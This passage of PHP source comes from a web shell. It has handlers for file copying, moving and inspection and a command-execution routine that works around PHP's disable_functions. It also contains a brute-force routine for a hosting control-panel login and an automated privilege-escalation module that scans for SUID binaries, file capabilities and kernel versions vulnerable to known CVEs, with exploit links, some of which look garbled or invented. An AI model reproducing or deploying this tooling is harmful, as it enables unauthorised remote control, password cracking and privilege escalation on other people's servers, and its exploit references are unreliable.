                                if($skey!=="" && stripos($f->getPathname(),$skey)===false && stripos($bn,$skey)===false){ continue; }
                                if($sext!=="" && strtolower(pathinfo($bn,PATHINFO_EXTENSION))!==strtolower($sext)){ continue; }
                                $found[] = $f->getPathname();
                            }
                        }catch(Exception $e){ echo "<p style='color:red'>".$this->DFSH($e->getMessage())."</p>"; }
                        echo "<p>Scanned ~$scanned entries — <b>".count($found)."</b> match(es)".(count($found)>=500?" (capped at 500)":"")."</p>";
                        if(count($found)){
                            echo "<table class='scantable'><tr><th>Path</th><th>Size</th></tr>";
                            foreach($found as $fp){
                                echo "<tr><td>".$this->DFSH($fp)."</td><td>".(is_file($fp)?$this->DFSFormat(@filesize($fp)):"-")."</td></tr>";
                            }
                            echo "</table>";
                        }
                    }
                }
                echo "</div></section>";
            break;
            case "copy":
                $slashtype = $this->DFSSlash();
                $src = $this->Dec($this->query[0]).$this->Dec(($this->query[1] ?? ''));
                $src = $this->Dec($this->DFSDirFilter($src));
                echo "<section id='dfsrename'><h3 style='color:#fff;text-align:center'>Copy <span style='color:#FFD700'>".$this->DFSH(basename($src))."</span></h3>";
                if(isset($GLOBALS['DFConfig'][1]['newdest'])){
                    $dst = rtrim($GLOBALS['DFConfig'][1]['newdest'],'\\/').$slashtype.basename($src);
                    if($this->DFSCopyRec($src,$dst)){ $this->DFSPopupMSG(3,null,"Copied to $dst!",null,true); }
                    else{ $this->DFSPopupMSG(4,null,"Copy failed (perm?)",null,true); }
                }else{
                    echo "<form action='' method='POST'><table><tr><td><label>Source : </label></td><td><label>".$this->DFSH($src)."</label></td></tr>";
                    echo "<tr><td><label>Dest dir : </label></td><td><input type='text' name='newdest' placeholder='/tmp/copy_to/'></td></tr>";
                    echo "<tr><td></td><td><input type='submit' value='Copy'></td></tr></table></form>";
                }
                echo "</section>";
            break;
            case "move":
                $slashtype = $this->DFSSlash();
                $src = $this->Dec($this->query[0]).$this->Dec(($this->query[1] ?? ''));
                $src = $this->Dec($this->DFSDirFilter($src));
                echo "<section id='dfsrename'><h3 style='color:#fff;text-align:center'>Move <span style='color:#FFD700'>".$this->DFSH(basename($src))."</span></h3>";
                if(isset($GLOBALS['DFConfig'][1]['newdest'])){
                    $dst = rtrim($GLOBALS['DFConfig'][1]['newdest'],'\\/').$slashtype.basename($src);
                    @mkdir(dirname($dst),0755,true);
                    if(@rename($src,$dst)){ $this->DFSPopupMSG(5,"","Moved successfully!","",true); echo "<script>setTimeout(function(){ window.location.replace('?dfp=".urlencode($GLOBALS['DFConfig'][1]['reflink'] ?? '')."') },1500);</script>"; }
                    else{ $this->DFSPopupMSG(4,null,"Move failed (perm?)",null,true); }
                }else{
                    $this->string = dirname($src); $refl = $this->Enc();
                    echo "<form action='' method='POST'><input type='hidden' name='reflink' value='$refl'>";
                    echo "<table><tr><td><label>Source : </label></td><td><label>".$this->DFSH($src)."</label></td></tr>";
                    echo "<tr><td><label>Dest dir : </label></td><td><input type='text' name='newdest' placeholder='/tmp/move_to/'></td></tr>";
                    echo "<tr><td></td><td><input type='submit' value='Move'></td></tr></table></form>";
                }
                echo "</section>";
            break;
            case "info":
                $pathfile = $this->Dec(($this->query[0])).$this->Dec(($this->query[1] ?? ''));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                $this->DFSCurrent($this->DFSSlash());
                echo "<section class='fileinfo'><h3>File Info</h3>";
                if(!file_exists($pathfile)){ echo "<p style='color:red'>Not found: ".$this->DFSH($pathfile)."</p>"; }
                else{
                    $isDir = is_dir($pathfile);
                    echo "<table class='scantable'>";
                    echo "<tr><td>Path</td><td>".$this->DFSH($pathfile)."</td></tr>";
                    echo "<tr><td>Type</td><td>".($isDir?"directory":(@mime_content_type($pathfile) ?: 'file'))."</td></tr>";
                    echo "<tr><td>Size</td><td>".($isDir?"-":$this->DFSFormat(@filesize($pathfile)))."</td></tr>";
                    echo "<tr><td>Perms</td><td>".$this->DFSPerms($pathfile)." (".$this->DFSMod(@fileperms($pathfile)).")</td></tr>";
                    echo "<tr><td>Owner:Group</td><td>".$this->DFSH($this->DFSOG($pathfile))."</td></tr>";
                    echo "<tr><td>Modified</td><td>".@date("Y-m-d H:i:s",@filemtime($pathfile))."</td></tr>";
                    if(!$isDir){
                        echo "<tr><td>MD5</td><td>".@md5_file($pathfile)."</td></tr>";
                        echo "<tr><td>SHA1</td><td>".@sha1_file($pathfile)."</td></tr>";
                    }
                    echo "</table>";
                }
                echo "</section>";
            break;
            case "phpinfo":
                echo "<section class='fileinfo'><h3>PHP Info</h3>";
                echo "<style>"
                .".pi-dark{background:#000!important;color:#FFD700;border-radius:10px;padding:10px;overflow:auto;max-height:600px;text-align:left}"
                .".pi-dark table{width:100%;border-collapse:collapse;background:#000!important;color:#ddd;margin-bottom:12px}"
                .".pi-dark td,.pi-dark th{border:1px solid #4a3d05!important;padding:5px 8px;font-size:12px;background:#000!important;color:#ddd!important}"
                .".pi-dark tr.h td,.pi-dark tr.h th{background:#1a1500!important;color:#FFD700!important;font-weight:bold}"
                .".pi-dark td.e,.pi-dark th.e{background:#0d0b00!important;color:#FFD700!important}"
                .".pi-dark td.v{background:#000!important;color:#ddd!important;word-break:break-all}"
                .".pi-dark a{color:#69e01f!important}"
                .".pi-dark font{color:#ddd!important}"
                .".pi-dark hr{border-color:#4a3d05}"
                .".pi-dark h1,.pi-dark h2{color:#FFD700!important}"
                ."</style>";
                echo "<div class='pi-dark'>";
                ob_start(); phpinfo(); $pi = ob_get_clean();
                // strip outer html + php's own <style> to embed safely in dark theme
                $pi = preg_replace('%^.*<body>%s','',$pi); $pi = preg_replace('%</body>.*$%s','',$pi);
                $pi = preg_replace('%<style.*?</style>%s','',$pi);
                echo $pi;
echo "</div></section>";
             break;
            case "lpe":
                echo $this->DFSLPE();
             break;
         }
     }

    public function DFSExecute($command){
        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
            $GLOBALS['DFSyntax'][3]($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
        }else{
            $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
        }
        if($this->DFSDat('ini','disable_functions')!=="None"){
            $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
            $disCMD = array_map('trim', $disCMD);
            foreach($GLOBALS['DFSCmd'] as $cmd){
                if(!in_array($cmd,$disCMD)){
                    $availCMD = $cmd;
                    switch($availCMD){
                        case $GLOBALS['DFSCmd'][4]:
                            return $this->DFSProcOpen($command);
                        break;
                        case $GLOBALS['DFSCmd'][1]:
                        case $GLOBALS['DFSCmd'][2]:
                            print($availCMD($command));
                            return $GLOBALS['DFSCmd'][1]($command);
                        break;
                        default:
                        return $availCMD($command);
                        break;
                    }
                    break;
                }
            }

        }else{
            return system($command);
        }
    }

    private function DFSProcOpen($command){
        $descriptorspec = array(
            0 => array('pipe', 'r'), // shell can read from STDIN
            1 => array('pipe', 'w'), // shell can write to STDOUT
            2 => array('pipe', 'w')  // shell can write to STDERR
        );
        $exec = $command;
        $process = $GLOBALS['DFSCmd'][4]($exec, $descriptorspec, $pipes, null, null);
        
        if(is_resource($process)){
            $retCMD = $GLOBALS['DFSyntax'][14]($pipes[1]);
            echo $retCMD;
            proc_close($process);
        }else{
            echo "Fail to execute!";
        }
    }
    private function DFSWinPathCheck(){
        $partition = array("A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:",
        "N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:");
        $available = array();
        foreach($partition as $part){
            if(is_dir($part)){
                array_push($available,$part);
            }
        }
        return $available;
    }

    private function DFSCracker($host,$port,$user,$pass,$timeout){
        $ch = curl_init();
    
        $qdata = array(
            'user'=>$user,
            'pass'=>$pass,
            'goto_uri'=>'/'
        );
    
        curl_setopt($ch, CURLOPT_URL, "https://$host:" . $port . "/login/?login_only=1");
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $qdata);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    
        $data = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
        if ( curl_errno($ch) == 28 )
        {
            print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
            <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
            , Sleep for 5s .</font></font></b></p>";
            sleep(5);
        }
        else if ( curl_errno($ch) == 0 )
        {
            $safeU = htmlspecialchars($user,ENT_QUOTES,'UTF-8'); $safeP = htmlspecialchars($pass,ENT_QUOTES,'UTF-8');
            print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
            Cracking Success With Username &quot;</font><font color=\"#FF0000\">$safeU</font><font color=\"#008000\">\"
            and Password \"</font><font color=\"#FF0000\">$safeP</font><font color=\"#008000\">\"</font></b><br><br>";
        }
        else{
            if($httpcode===0){
                echo "No response <br>";
                curl_setopt($ch, CURLOPT_URL, "http://$host:" . $port);
                curl_setopt($ch, CURLOPT_HEADER, TRUE);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $cont = curl_exec($ch);
                $farr = explode("URL=",$cont);
                $narr = explode('"></head>',$farr[1]);
                echo "Please change to this host -> ". $narr[0];
                exit;
            }
            //echo $httpcode;
        }
        curl_close($ch);
    }

    public function DFSCurrent($slashtype){
        echo "<div class='currentfolder'>Current folder : ";

        $truepath = array();
        
        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
            $path = $this->DFSDirFilter($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
            $path = $this->Dec($path);
        }else{
            $path = getcwd();
        }
        
        $dfsEP = explode($slashtype,$path);
        $dfsSZ = sizeof(($dfsEP));
        $dfsGE = "";
        for($c=0;$c<$dfsSZ;$c++){
            array_push($truepath,$dfsEP[$c]);
        }
        if($GLOBALS['DFSPlatform']!=='win'){
            $endslash = $this->DFSDirFilter($slashtype);
            echo "<a href='?dfp=".urlencode($endslash)."'>$slashtype</a>";
        }
        for($i=0;$i<sizeof($truepath);$i++){
            if(!empty($dfsEP[$i]) || !$dfsEP[$i]==""){
                if($GLOBALS['DFSPlatform']!=='win'){
                    $dfsGE .=  $slashtype . $dfsEP[$i];
                }else{
                    $dfsGE .= $dfsEP[$i] . $slashtype ;
                }
                
                $dfsGEn = $this->DFSDirFilter($dfsGE);
                //$this->string = preg_replace('/'.$slashtype.$slashtype.'/i',$slashtype,$dfsGE);
                echo "<a href='?dfp=".urlencode($dfsGEn)."'>".$this->DFSH($dfsEP[$i])."</a>";
                echo $slashtype;
            }

        }
        
        echo "</div>";
    }

    public function DFSOG($file){
        if($GLOBALS['DFSPlatform']!=='win'){
            $owner_file = (fileowner($file)?:0);
            $group_file = (filegroup($file)?:0);
            $checkposix = $this->DFSDat('ini','disable_functions');
            if($checkposix !=="None"){
                $checkposix = explode(",",$checkposix);
                if(!in_array("posix_getpwuid",$checkposix)){
                    $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                    $grpx = posix_getpwuid($group_file)['name'];
                    if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                        $owner_group = $ownx . ':' . ($grpx?:$ownx);
                    }else{
                        $owner_group = "nobody:nobody";
                    }
                }else{
                    $owner_group = "-:-";
                }
            }else{
                $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
                $grpx = posix_getpwuid($group_file)['name'];
                if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
                    $owner_group = $ownx . ':' . ($grpx?:$ownx);
                }else{
                    $owner_group = "nobody:nobody";
                }
            }
            
        }else{
            $owner_group = "-:-";
        }
        return $owner_group;
    }

    public function DFSPerms($f) { // Special thanks to marijuana shell developer
        $p = $GLOBALS['DFSyntax'][1]($f);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
        return $i;
    }

    private function DFSMod($code){
        return substr(sprintf("%o",$code),-4);
    }

    public function DFSChange($loc,$code){
        $def = 0;
        for($i=strlen($code)-1;$i>=0;--$i)
            $def += (int)$code[$i]*pow(8, (strlen($code)-$i-1));
        if(is_dir($loc) || is_file($loc)){
            if(chmod($loc,$def)){
                return true;
            }else{
                return false;
            }
        }
    }

    public function DFSDat($ch,$value){
        switch(strtolower($ch)){
            case 'ini':
                if(strtolower($value)!=='disable_functions')
                {
                    if(!ini_get($value)){
                        return "OFF";
                    }else{
                        return "ON";
                    }
                }
                else
                {
                    if(!ini_get($value)){
                        return "None";
                    }else{
                        return ini_get($value);
                    }
                }
            break;
            case 'func':
                if(!function_exists($value)){
                    return "OFF";
                }else{
                    return "ON";
                }
            break;
        }
    }

    public function DFSInfo(){
        if($GLOBALS['DFSPlatform']==='lin'){
            $OSID = "";
        }
        $disklink = "";
        $encstr = array();
        $diskavail = $this->DFSWinPathCheck();
        foreach($diskavail as $item){
            $diskstr = $item . "\\";
            $this->string = $diskstr;
            $disklink .= "<a href='?dfp=".$this->Enc()."'>$diskstr</a> , ";
        }
        $contents = "<div class='intros'>
Server Info : ".$this->DFSH(substr(@php_uname(),0,120))."<br>
Server Software : ".$this->DFSH($GLOBALS['DFConfig'][2]['SERVER_SOFTWARE'] ?? '')."<br>
Current User : ".$this->DFSH(@get_current_user())." | Disk FreeSpace : ".$this->DFSFormat(@diskfreespace($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']))." | PHP ".PHP_VERSION."<br>
Server Address : ".$this->DFSH($GLOBALS['DFConfig'][2]['SERVER_ADDR'] ?? '')." | 
Your Address : ".$this->DFSH($GLOBALS['DFConfig'][2]['REMOTE_ADDR'] ?? '')."<br>
Safe Mode : ".$this->DFSDat('ini','safe_mode')." |
Server Email : ".$this->DFSH($GLOBALS['DFConfig'][2]['SERVER_ADMIN'] ?? '')."<br>
Disable Functions : ".$this->DFSH($this->DFSDat('ini','disable_functions'))." | 
cURL : ".$this->DFSDat('func','curl_version')." | 
MySQL : ".$this->DFSDat('func','mysqli_connect')." | Zip : ".(class_exists('ZipArchive')?'ON':'OFF')."<br>
Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." | Disk : ".$disklink."
</div>%{main}%";
        return $contents;
    }

    // ===== v2.5: AUTO LPE (Local Privilege Escalation) =====
    // Cross-platform (Linux + Windows) privilege escalation enumeration.
    // Modular design — each technique is self-contained and reports its own status.

    private $lpeFindings = array(); // collected findings
    private $lpeTechniques = array(); // technique log
    private $lpePlatform = '';       // 'linux' | 'windows'
    private $lpeArch = '';           // 'x86_64', 'i386', 'AMD64', etc.
    private $lpeKernel = '';         // kernel version / Windows build
    private $lpeUser = '';
    private $lpeIsRoot = false;

    // --- Private helpers for command execution ---

    private function DFSLPECmd($cmd, $timeout=10){
        $des = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
        $proc = @proc_open($cmd, $des, $pipes, null, array('bypass_shell'=>true));
        if(!is_resource($proc)) return '';
        fclose($pipes[0]);
        // Non-blocking reads bounded by (a) 1MB stdout / 256KB stderr caps and (b) $timeout seconds.
        // Prevents a runaway or hung child from exhausting memory or hanging the request.
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        $out = ''; $err = '';
        $deadline = microtime(true) + $timeout;
        while(true){
            $out .= (string)stream_get_contents($pipes[1]);
            $err .= (string)stream_get_contents($pipes[2]);
            $childDone = (feof($pipes[1]) && feof($pipes[2]));
            $timedOut  = (microtime(true) > $deadline);
            $capped    = (strlen($out) >= 1048576 || strlen($err) >= 262144);
            if($childDone || $timedOut || $capped) break;
            usleep(50000);
        }
        $childDone = (feof($pipes[1]) && feof($pipes[2]));
        $timedOut  = (microtime(true) > $deadline);
        $capped    = (strlen($out) >= 1048576 || strlen($err) >= 262144);
        if(!$childDone && ($timedOut || $capped) && is_resource($proc)) @proc_terminate($proc);
        @fclose($pipes[1]); @fclose($pipes[2]);
        @proc_close($proc);
        return trim($out);
    }

    private function DFSLPEWinCmd($cmd){
        return $this->DFSLPECmd('cmd.exe /c "'.$cmd.'"');
    }

    private function DFSLPEWinPS($cmd){
        // Use -EncodedCommand (UTF-16LE base64) to avoid cmd.exe/PowerShell quote-escaping issues.
        if(function_exists('iconv')){
            $utf16 = iconv('UTF-8','UTF-16LE',$cmd);
        }elseif(function_exists('mb_convert_encoding')){
            $utf16 = mb_convert_encoding($cmd,'UTF-16LE','UTF-8');
        }else{
            $utf16 = '';
            $len = strlen($cmd);
            for($i=0;$i<$len;$i++){ $utf16 .= $cmd[$i]."\x00"; }
        }
        return $this->DFSLPECmd('powershell.exe -NoProfile -NonInteractive -EncodedCommand '.base64_encode($utf16));
    }

    private function DFSLPELog($technique, $status, $reason, $severity='info'){
        // status: 'checked','found','not_found','skipped','error'
        $this->lpeTechniques[] = array(
            'technique' => $technique,
            'status'    => $status,
            'reason'    => $reason,
            'severity'  => $severity
        );
    }

    private function DFSLPEAdd($title, $severity, $body, $exploit=''){
        $this->lpeFindings[] = array(
            'title'    => $title,
            'severity' => $severity,
            'body'     => $body,
            'exploit'  => $exploit
        );
    }

    // --- OS / Architecture / Kernel detection ---

    private function DFSLPEDetectOS(){
        $this->lpeUser = @get_current_user();
        $uname = @php_uname();
        $this->lpeArch = @php_uname('m');
        $os = strtoupper(PHP_OS);
        if(strpos($os,'WIN')!==false){
            $this->lpePlatform = 'windows';
            $build = $this->DFSLPEWinCmd('ver');
            $this->lpeKernel = $build ? $build : @php_uname('r');
            $this->lpeIsRoot = $this->DFSLPEIsWinAdmin();
        }elseif(strpos($os,'DARWIN')!==false){
            $this->lpePlatform = 'linux'; // macOS: treat as unix, run linux checks
            $this->lpeKernel = @php_uname('r');
            $this->lpeIsRoot = (function_exists('posix_getuid') && posix_getuid()===0);
        }else{
            $this->lpePlatform = 'linux';
            $this->lpeKernel = @php_uname('r');
            $this->lpeIsRoot = (function_exists('posix_getuid') && posix_getuid()===0);
        }
        // Handle platform detection failure: check for Windows paths
        if($this->lpePlatform==='linux' && $this->DFSLPEIsActuallyWindows()){
            $this->lpePlatform = 'windows';
        }
    }

    private function DFSLPEIsActuallyWindows(){
        // PHP_OS can report "Linux" under some Windows PHP builds (rare), check env markers
        return (getenv('WINDIR')!==false || getenv('SystemRoot')!==false || getenv('ProgramFiles')!==false);
    }

    private function DFSLPEIsWinAdmin(){
        $out = $this->DFSLPEWinPS("([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)");
        return (stripos($out,'True')!==false);
    }

    private function DFSLPEParseWinBuild(){
        // Try wmic first (may be removed on Windows 11), then fall back to registry / powershell.
        $ver = $this->DFSLPEWinCmd('wmic os get BuildNumber,Version /value');
        $build = '';
        if(preg_match('/BuildNumber=(\d+)/i',$ver,$m)) $build = $m[1];
        $verStr = '';
        if(preg_match('/Version=([\d.]+)/i',$ver,$m)) $verStr = $m[1];

        if(empty($build)){
            // Fallback: query registry via PowerShell — works where wmic is unavailable.
            $reg = $this->DFSLPEWinPS("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').CurrentBuildNumber");
            if(preg_match('/(\d{4,})/',$reg,$m)) $build = $m[1];
            $reg2 = $this->DFSLPEWinPS("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').DisplayVersion");
            if(preg_match('/([\d.]+)/',$reg2,$m)) $verStr = $m[1];
            if(empty($verStr)){
                $reg3 = $this->DFSLPEWinPS("(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').CurrentVersion");
                if(preg_match('/([\d.]+)/',$reg3,$m)) $verStr = $m[1];
            }
        }
        return array('build'=>$build, 'version'=>$verStr);
    }

    // --- Linux techniques ---

    private function LPE_Linux_SUID(){
        $t = 'SUID/SGID Binary Enumeration';
        $this->DFSLPELog($t,'checked','Scanning for SUID/SGID binaries','high');

        // SUID
        $suidOut = $this->DFSLPECmd('find / -perm -4000 -type f 2>/dev/null | head -50');
        $sgidOut = $this->DFSLPECmd('find / -perm -2000 -type f 2>/dev/null | head -30');
        if(empty($suidOut) && empty($sgidOut)){
            $this->DFSLPELog($t,'not_found','No SUID/SGID binaries found','high');
            return;
        }

        // GTFOBins cross-reference for common exploitable SUID binaries
        $gtfobins = array('bash','dash','sh','zsh','csh','python','python2','python3','perl','ruby','lua',
            'php','node','vim','vi','nano','less','more','find','nmap','awk','env','strace','ltrace',
            'taskset','time','timeout','man','ftp','wget','curl','socat','ssh','scp','nc','ncat',
            'tar','zip','unzip','base64','dd','tee','cp','mv','chmod','chown','chgrp','pkexec',
            'doas','mount','umount','fusermount','fusermount3','crontab','at','qmail-remote',
            'docker','lxc','apt-get','yum','dnf','pacman','dpkg','rpm','git','make','gcc',
            'gdb','as','ld','objdump','readelf','strings','file','diff','ed','sed','dd','ar');

        $body = '';
        if(!empty($suidOut)){
            $lines = array_filter(explode("\n",trim($suidOut)));
            $body .= "<h4 style='color:#f70000'>SUID Binaries (".count($lines).")</h4><pre>".htmlspecialchars(trim($suidOut))."</pre>";
            // Cross-ref with GTFOBins
            $exploitable = array();
            foreach($lines as $line){
                $bin = basename(trim($line));
                if(in_array($bin,$gtfobins)){
                    $exploitable[] = $bin;
                }
            }
            if(!empty($exploitable)){
                $body .= "<p style='color:#f70000'><b>Exploitable SUID binaries (GTFOBins):</b> ".htmlspecialchars(implode(', ',$exploitable))."</p>";
                $body .= "<p style='color:#aaa;font-size:11px'>Check <code>https://gtfobins.github.io</code> for exploitation techniques for each binary.</p>";
            }
        }
        if(!empty($sgidOut)){
            $body .= "<h4 style='color:#FFD700'>SGID Binaries (".substr_count(trim($sgidOut),"\n").")</h4><pre>".htmlspecialchars(trim($sgidOut))."</pre>";
        }

        $this->DFSLPEAdd('SUID/SGID Binaries', 'high', $body);
        $this->DFSLPELog($t,'found',"Found SUID/SGID binaries",'high');
    }

    private function LPE_Linux_Capabilities(){
        $t = 'Linux Capabilities Scan';
        $this->DFSLPELog($t,'checked','Scanning for file capabilities via getcap','high');

        $capsOut = $this->DFSLPECmd('getcap -r / 2>/dev/null | head -40');
        if(empty($capsOut)){
            $this->DFSLPELog($t,'not_found','No file capabilities found (getcap not installed or none set)','medium');
            return;
        }

        $dangerCaps = array('cap_setuid','cap_setgid','cap_dac_override','cap_dac_read_search',
            'cap_sys_admin','cap_sys_ptrace','cap_sys_module','cap_sys_rawio','cap_net_admin','cap_net_raw');
        $dangerous = array();
        $lines = explode("\n",trim($capsOut));
        foreach($lines as $line){
            foreach($dangerCaps as $dc){
                if(stripos($line,$dc)!==false) $dangerous[] = trim($line);
            }
        }

        $body = "<pre>".htmlspecialchars(trim($capsOut))."</pre>";
        if(!empty($dangerous)){
            $body .= "<p style='color:#f70000'><b>Dangerous capabilities detected:</b></p><ul>";
            foreach($dangerous as $d) $body .= "<li style='color:#f70000'>".htmlspecialchars($d)."</li>";
            $body .= "</ul>";
        }
        $sev = !empty($dangerous) ? 'critical' : 'medium';
        $this->DFSLPEAdd('Linux Capabilities', $sev, $body);
        $this->DFSLPELog($t,'found',"Capabilities found (".count($lines)." total, ".count($dangerous)." dangerous)",$sev);
    }

    private function LPE_Linux_KernelCVE(){
        $t = 'Kernel CVE Detection';
        $kernel = php_uname('r');
        $this->DFSLPELog($t,'checked',"Checking kernel $kernel against known LPE CVEs",'high');

        // Known Linux kernel LPE CVEs with version ranges
        $cves = array(
            // Dirty Pipe - CVE-2022-0847
            array('cve'=>'CVE-2022-0847','name'=>'Dirty Pipe',
                'min'=>'5.8.0','max'=>'5.16.11','fixed'=>'5.16.12',
                'desc'=>'Overwrite arbitrary read-only files via splice()',
                'exploit'=>'https://github.com/real-go/dirty-pipe-scroll-exploit'),
            // PwnKit - CVE-2021-4034
            array('cve'=>'CVE-2021-4034','name'=>'PwnKit (pkexec)',
                'pkexec'=>true,
                'desc'=>'Memory corruption in polkit pkexec via argument injection',
                'exploit'=>'https://github.com/ly4k/PwnKit'),
            // Dirty COW - CVE-2016-5195
            array('cve'=>'CVE-2016-5195','name'=>'Dirty COW',
                'min'=>'2.6.22','max'=>'4.8.3','fixed'=>'4.8.3',
                'desc'=>'Race condition in mm/gup.c allows write to read-only mappings',
                'exploit'=>'https://github.com/dirtycow/dirtycow.github.io'),
            // Baron Samedit - CVE-2021-3156
            array('cve'=>'CVE-2021-3156','name'=>'Baron Samedit (sudo)',
                'sudo'=>true,
                'desc'=>'Heap overflow in sudo before 1.9.5p2',
                'exploit'=>'https://github.com/blasty/CVE-2021-3156'),
            // Dirty COW 2 - CVE-2022-2588
            array('cve'=>'CVE-2022-2588','name'=>'nft_obj_use',
                'min'=>'5.8.0','max'=>'6.4.1',
                'desc'=>'Netfilter nf_tables use-after-free',
                'exploit'=>'https://github.com/ktplant/CVE-2022-2588'),
            // OverlayFS - CVE-2023-0386
            array('cve'=>'CVE-2023-0386','name'=>'OverlayFS LPE',
                'min'=>'5.11.0','max'=>'6.2.2',
                'desc'=>'OverlayFS copy_up allows privileged file writes',
                'exploit'=>'https://github.com/phkernel/CVE-2023-0386'),
            // StackRot - CVE-2023-3269
            array('cve'=>'CVE-2023-3269','name'=>'StackRot',
                'min'=>'6.1.0','max'=>'6.4.1',
                'desc'=>'Use-after-free in maple tree race condition',
                'exploit'=>'https://github.com/lrh2000/StackRot'),
            // DirtyCred - CVE-2023-3263
            array('cve'=>'CVE-2023-3263','name'=>'DirtyCred',
                'min'=>'5.8.0','max'=>'6.4.4',
                'desc'=>'Use-after-free in credential management',
                'exploit'=>'https://github.com/ERROR-SYS/DVE'),
            // GameOver(lay) - CVE-2023-2640 + CVE-2023-32629
            array('cve'=>'CVE-2023-2640','name'=>'GameOver(lay) Ubuntu',
                'distro'=>'ubuntu',
                'desc'=>'OverlayFS + UNMAP_ON_RENAME allows full root on Ubuntu kernels',
                'exploit'=>'https://github.com/g1vi/GameOver-Lay'),
            // DirtyFrag - CVE-2024-36971
            array('cve'=>'CVE-2024-36971','name'=>'DirtyFrag',
                'min'=>'3.15.0',
                'desc'=>'Net route UAF, exploited in the wild',
                'exploit'=>'https://github.com/google/google安全公告'),
            // nf_tables UAF - CVE-2024-1086
            array('cve'=>'CVE-2024-1086','name'=>'nf_tables UAF',
                'min'=>'5.14.0','max'=>'6.7.1',
                'desc'=>'Use-after-free in nf_tables allows local privilege escalation',
                'exploit'=>'https://github.com/Notselworthy/CVE-2024-1086'),
            // vsock - CVE-2023-1076
            array('cve'=>'CVE-2023-1076','name'=>'vsock Race',
                'min'=>'3.10.0','max'=>'6.2.1',
                'desc'=>'Race condition in vsock transport reassignment',
                'exploit'=>'https://github.com/PaloAltoNetworks/Unit42'),
        );

        $foundCVEs = array();
        foreach($cves as $cve){
            // pkexec check
            if(isset($cve['pkexec'])){
                $pkexecPath = $this->DFSLPECmd('which pkexec 2>/dev/null');
                if(!empty($pkexecPath)){
                    // Check if pkexec is SUID
                    $perms = $this->DFSLPECmd('ls -la '.$pkexecPath);
                    if(strpos($perms,'-rws')!==false){
                        $foundCVEs[] = $cve;
                    }
                }
                continue;
            }
            // sudo check
            if(isset($cve['sudo'])){
                $sudoVer = $this->DFSLPECmd('sudo --version 2>/dev/null | head -1');
                if(preg_match('/version\s+([\d.]+\w*)/i',$sudoVer,$m)){
                    $ver = $m[1];
                    if(version_compare($ver,'1.9.5p2','<')){
                        $foundCVEs[] = $cve;
                    }
                }
                continue;
            }
            // Kernel version range check
            if(isset($cve['min'])){
                $k = php_uname('r');
                $min = $cve['min'];
                $max = isset($cve['max']) ? $cve['max'] : '99.99.99';
                if(version_compare($k,$min,'>=') && version_compare($k,$max,'<=')){
                    $foundCVEs[] = $cve;
                }
            }
        }

        if(empty($foundCVEs)){
            $this->DFSLPELog($t,'not_found',"No matching kernel CVEs found for $kernel",'medium');
            $this->DFSLPEAdd('Kernel Version Info','info',
                "<p>Running kernel: <b>".htmlspecialchars($kernel)."</b></p><p style='color:#aaa;font-size:11px'>No known high-impact kernel CVEs matched this exact version. Check Exploit-DB for additional vectors.</p>");
            return;
        }

        $body = "<p>Running kernel: <b>".htmlspecialchars($kernel)."</b></p>";
        $body .= "<p style='color:#f70000'><b>".count($foundCVEs)." matching CVE(s) found:</b></p>";
        foreach($foundCVEs as $cve){
